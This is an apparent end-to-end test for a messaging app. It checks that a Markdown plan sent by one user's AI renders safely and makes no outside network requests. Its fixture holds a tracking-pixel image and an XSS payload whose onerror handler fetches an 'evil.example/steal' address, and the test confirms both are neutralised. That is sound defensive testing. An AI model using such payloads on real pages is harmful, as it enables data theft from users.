// REL051-A34 (D-149; 08 §1; I-5): the owner's key case. Ana's AI sends Bo a build plan as a .md
// file; Bo's app saves it by itself (D-142), shows it as a chip in the message it came with, and
// opens it in the reader: rendered headings and lists, raw HTML as text, no anchor and no image,
// links copy-only. Nothing the reader shows reaches outside this computer: the page makes no
// request to any host but its own while the file is open.
//
// With SHOTS_DIR set, it also saves the chip and the reader in light and dark, desktop and phone.
import { mkdir, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chapter, eventually, journeyWorld, navTo, pairedOwners } from './world.js';

const ch = chapter();
beforeAll(() => ch.start(), 120_000);
afterAll(() => ch.stop());

const PLAN = [
  '# Build plan: class project',
  '',
  'Ana here. My AI wrote this for **your** AI: the *architecture* and the steps.',
  '',
  '## Architecture',
  '',
  '| Part | Stack | Owner |',
  '| --- | --- | :-: |',
  '| Web app | Vite + React | Ana |',
  '| API | Hono on Node | Bo |',
  '',
  '## Steps',
  '',
  '1. Scaffold with `pnpm create vite`',
  '2. Add the API',
  '   - routes in `src/api`',
  '   - tests with Vitest',
  '3. Deploy',
  '',
  '> Keep the first version small.',
  '',
  '```ts',
  "export const app = new Hono().get('/health', (c) => c.text('ok'));",
  '```',
  '',
  'Docs: [Hono guide](https://hono.dev/docs) · ![diagram](https://evil.example/pixel.png)',
  '',
  '<img src=x onerror="fetch(\'https://evil.example/steal\')">',
  '',
].join('\n');

describe('chapter 11: a Markdown plan in the reader', () => {
  it("Ana's AI sends plan.md; Bo opens the chip and reads it rendered, safely", async (ctx) => {
    const ready = ch.need(ctx);
    if (ready === undefined) return;
    const world = journeyWorld();
    const { pcA, b, mcpA } = await pairedOwners(ready.browser, ready.files, world, ch.closers);
    const send = join(pcA.home, 'AgentLink', 'Send');
    await mkdir(send, { recursive: true });
    await writeFile(join(send, 'plan.md'), PLAN, { mode: 0o600 });
    const sent = await mcpA.call('agentlink_send', {
      to: 'Bo',
      text: 'Here is the build plan for our project.',
      path: join(send, 'plan.md'),
    });
    expect(sent.structured['status']).toBe('ok');

    await navTo(b.page, 'Home');
    const anaRow = b.page
      .getByRole('button', { name: /^A(na)?\b/ })
      .filter({ hasText: 'Ana' })
      .first();
    await anaRow.waitFor({ timeout: 30_000 });
    await anaRow.click();
    const chip = b.page.locator('.hm-msg .hm-chip').filter({ hasText: 'plan.md' }).first();
    await chip.waitFor({ timeout: 30_000 });
    await eventually('the plan is saved', async () =>
      ((await chip.textContent()) ?? '').includes('Saved to'),
    );
    expect(await chip.textContent()).toContain('Markdown');

    // Every request from here on stays on this computer.
    const origin = new URL(b.page.url()).origin;
    const outside: string[] = [];
    b.page.on('request', (r) => {
      if (!r.url().startsWith(origin) && !r.url().startsWith('data:')) outside.push(r.url());
    });

    const shots = process.env['SHOTS_DIR'];
    const snap = async (name: string): Promise<void> => {
      if (shots === undefined || shots === '') return;
      // Past the sheet's entrance motion.
      await b.page.waitForTimeout(700);
      await b.page.screenshot({ path: join(shots, `${name}.png`) });
    };
    await snap('chip-light-desktop');

    await chip.getByRole('button', { name: 'Open', exact: true }).click();
    const reader = b.page.getByRole('dialog');

    await reader.locator('h3').filter({ hasText: 'Build plan: class project' }).waitFor();
    await reader.locator('h4').filter({ hasText: 'Architecture' }).waitFor();
    expect(await reader.locator('table th').allTextContents()).toEqual(['Part', 'Stack', 'Owner']);
    expect(await reader.locator('ol > li').count()).toBe(3);
    expect(await reader.locator('pre code').first().textContent()).toContain('new Hono()');
    expect(await reader.locator('a, img, iframe, script').count()).toBe(0);
    expect(await reader.textContent()).toContain('<img src=x onerror=');
    expect(await reader.textContent()).toContain("From Ana's AI");
    expect(await reader.textContent()).toContain('hono.dev');
    await b.page.waitForTimeout(500);
    expect(outside).toEqual([]);
    await snap('reader-light-desktop');

    if (shots !== undefined && shots !== '') {
      await b.page.emulateMedia({ colorScheme: 'dark' });
      await b.page.evaluate(() => document.documentElement.setAttribute('data-theme', 'dark'));
      await snap('reader-dark-desktop');
      await b.page.keyboard.press('Escape');
      await snap('chip-dark-desktop');
      await b.page.setViewportSize({ width: 390, height: 844 });
      await snap('chip-dark-phone');
      await chip.getByRole('button', { name: 'Open', exact: true }).click();
      await reader.locator('h3').first().waitFor();
      await snap('reader-dark-phone');
      await b.page.emulateMedia({ colorScheme: 'light' });
      await b.page.evaluate(() => document.documentElement.setAttribute('data-theme', 'light'));
      await snap('reader-light-phone');
      await b.page.keyboard.press('Escape');
      await snap('chip-light-phone');
    }

    // Escape closes the reader; the chip's Open has the focus again.
    if ((await reader.count()) > 0) await b.page.keyboard.press('Escape');
    await eventually(
      'the reader closed',
      async () => (await b.page.getByRole('dialog').count()) === 0,
    );
    expect(outside).toEqual([]);
  }, 240_000);
});
